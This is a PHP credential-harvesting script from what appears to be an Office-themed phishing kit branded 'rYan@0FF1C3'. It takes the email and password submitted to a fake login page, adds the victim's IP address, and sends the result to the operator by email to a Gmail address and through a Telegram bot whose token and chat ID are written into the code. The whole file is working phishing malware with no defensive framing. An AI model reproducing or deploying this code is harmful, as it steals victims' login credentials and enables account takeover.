<?php
$chatId = "@CDX25N";
$botUrl = "bot1868134783:AAFO2HTVVBGF3AUS09PVj3hQFTEJCBAr06A";
$telegram = "on"; // off if u don't need result to telegram
$email_ids = "tradings2017@gmail.com"; // your email here 
extract($_REQUEST);

# Store Post values in variables
// Here variable $a is just an example (replace with your own variables)

$_SESSION['emaill']   = $_POST['emaill'];
$_SESSION['pw']   = $_POST['pw'];
$ip		= $_SERVER['REMOTE_ADDR'];

# Format for Telegram & Discord
// Here variable $a is just an example (replace with your own variables)

$data = "
+++++++++++🌐 rYan@0FF1C3 LOGIN INFO 🌐+++++++++++
EMAIL       = ".$_SESSION['emaill']."
Password    = ".$_SESSION['pw']."
+++++++++++🌐 rYan@0FF1C3 LOGIN INFO 🌐+++++++++++

+++++++++++🌐 rYan@0FF1C3 IP INFOS 🌐+++++++++++
IP      = http://www.geoplugin.net/json.gp?ip=$ip
+++++++++++🌐 rYan@0FF1C3 IP INFOS 🌐+++++++++++
";

$msg = "
+++++++++++🌐 rYan@0FF1C3 LOGIN INFO 🌐+++++++++++<br>
EMAIL       = ".$_SESSION['emaill']." <br>
Password    = ".$_SESSION['pw']." <br>
+++++++++++🌐 rYan@0FF1C3 LOGIN INFO 🌐+++++++++++
<br>
+++++++++++🌐 rYan@0FF1C3 IP INFOS 🌐+++++++++++<br>
IP      = http://www.geoplugin.net/json.gp?ip=$ip  <br>
+++++++++++🌐 rYan@0FF1C3 IP INFOS 🌐+++++++++++ <br>

";


// Email send function
$sender = 'From: 0FF1c33 <result@0ff1c33.com>';
$sub="NEW 0FF1C3 LOGIN FROM [$ip]";
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$result=mail($email_ids, $sub, $msg, $headers);

// Telegram send function
$txt = $data;
if ($telegram == "on"){
    $send = ['chat_id'=>$chatId,'text'=>$txt];
    $web_telegram = "https://api.telegram.org/{$botUrl}";
    $ch = curl_init($web_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}
